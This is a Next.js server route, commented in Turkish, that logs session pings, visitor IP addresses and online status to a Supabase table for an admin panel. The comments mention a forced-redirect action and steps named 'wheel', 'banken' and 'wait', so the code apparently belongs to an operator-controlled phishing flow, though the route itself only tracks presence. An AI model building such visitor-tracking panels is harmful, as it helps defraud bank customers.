import { NextResponse } from "next/server";
import { createServerClient } from "@supabase/ssr";
import { cookies } from "next/headers";

export const dynamic = 'force-dynamic';
export const runtime = 'nodejs';

const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const SERVICE_ROLE = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;

function pickIp(headers: Headers): string | null {
  const h1 = headers.get("x-forwarded-for");
  if (h1) return h1.split(",")[0].trim();
  const h2 = headers.get("cf-connecting-ip") || headers.get("x-real-ip");
  return h2 || null;
}

export async function POST(request: Request) {
  const headers = request.headers;
  const body = await request.json().catch(() => ({}));
  const sessionId = String(body?.sessionId || body?.session_id || "").trim();
  const publicId = body?.publicId || body?.public_id || null;
  const pathname = typeof body?.pathname === "string" ? body.pathname.slice(0, 500) : null;
  const currentStep = typeof body?.currentStep === "string" ? body.currentStep.slice(0, 80) : null;
  const desiredStatus =
    body?.status === "offline" ? "offline"
    : body?.status === "online" ? "online"
    : null;

  if (!sessionId) {
    return NextResponse.json({ ok: false, error: "sessionId required" }, { status: 400 });
  }

  const cookieStore = await cookies();
  const supabase = createServerClient(SUPABASE_URL, SERVICE_ROLE, {
    cookies: {
      getAll() { return cookieStore.getAll(); },
      setAll(cs: any[]) {
        try { cs.forEach(({ name, value, options }: any) => cookieStore.set(name, value, options)); } catch { /* noop */ }
      },
    },
  });

  const now = new Date().toISOString();
  // ANINDA OFFLINE gostermek icin: status='offline' istendiyse last_ping_at i 1 SAAT geriye at.
  // Boylece admin panelindeki "last_ping_at < 10sn" kurali OTOMATIK olarak bunu OFFLINE kabul eder.
  // Ayrica Supabase Realtime channel araciligiyla admin paneli SATIR GUNCELLEMESINI 0 sn'de alir.
  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
  const patch: any = {};

  if (desiredStatus === "online") {
    patch.status = "online";
    patch.last_ping_at = now;
  } else if (desiredStatus === "offline") {
    patch.status = "offline";
    patch.last_ping_at = oneHourAgo;
  } else {
    // Default: ping ONLINE
    patch.status = "online";
    patch.last_ping_at = now;
  }

  // ⚠️ CRITICAL: current_step GÜNCELLEMESİ PING ÜZERİNDEN KALDIRILDI.
  // ⚠️ Sebep: Admin current_step='wait' yaptığında (veya herhangi bir adım zorladığında) client
  // ⚠️     3 sn aralıklarla eski pathname'den ürettiği "wheel" / "banken" current_step'ini
  // ⚠️     DB'ye tekrar geri yazıyordu. Bu durum ADMİN PANELİNDE "Sayfa" sütununun SANIYEDE BİR
  // ⚠️     (yanıp sönen) şekilde değişmesine, kullanıcı hiçbir şey yapmadığı halde admin görselini
  // ⚠️     bozmasına neden oluyordu.
  //
  // ⚠️ current_step DEĞİŞİMİ ARTIK SADECE ŞU ŞEKİLLERDE OLABİLİR:
  //   1) Client tarafında submit/next butonuna tıklanınca (direct supabase update current_step).
  //   2) Admin panelinden Zorla Yönlendir aksiyonu (direct update)
  //   3) İlk mountta server step sync (window.location.href = target).
  //
  // if (currentStep && !patch.current_step) { patch.current_step = currentStep; }
  // ↑ ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑

  // DIKKAT: sessions tablosunda olmayan sütunları PATCH'E EKLEME.
  // Sadece kesin var olan alanları güncelle: status, last_ping_at, ip_address.
  const ip = pickIp(headers);
  if (ip) patch.ip_address = ip;

  try {
    const { data: before } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const existed = !!before;
    const { error } = await supabase.from("sessions").update(patch).eq("id", sessionId);
    if (error) {
      return NextResponse.json({ ok: false, error: error.message, code: error.code ?? null }, { status: 500 });
    }
    if (!existed) {
      try {
        if (publicId && typeof publicId === "string") {
          await supabase.from("sessions").update({
            last_ping_at: patch.status === "offline" ? oneHourAgo : now,
            status: patch.status,
            ...(patch.ip_address ? { ip_address: patch.ip_address } : {}),
          }).eq("id", publicId);
        }
      } catch { /* sessizce fallback denemesi */ }
      return NextResponse.json({
        ok: true, status: patch.status, ping_at: now,
        note: "session_not_found_by_id_tried_public_fallback",
        sessionId, publicId: publicId || null,
        step_updated_via_ping: false,
      }, { status: 200 });
    }
    // Ekstra savunma: status = 'online' olan ama last_ping_at > 90sn eski olan satırları topluca offline yap
    try {
      await supabase
        .from("sessions")
        .update({ status: "offline" })
        .eq("status", "online")
        .lt("last_ping_at", new Date(Date.now() - 90 * 1000).toISOString());
    } catch { /* sessizce */ }

    return NextResponse.json({
      ok: true,
      status: patch.status,
      ping_at: now,
      found: existed,
      step_updated_via_ping: false,
      incoming_step_sent: currentStep || null,
      ignored_step_reason: "step_changes_only_via_admin_direct_update_or_client_submit_buttons",
    });
  } catch (e: any) {
    return NextResponse.json({ ok: false, error: e?.message || String(e) }, { status: 500 });
  }
}
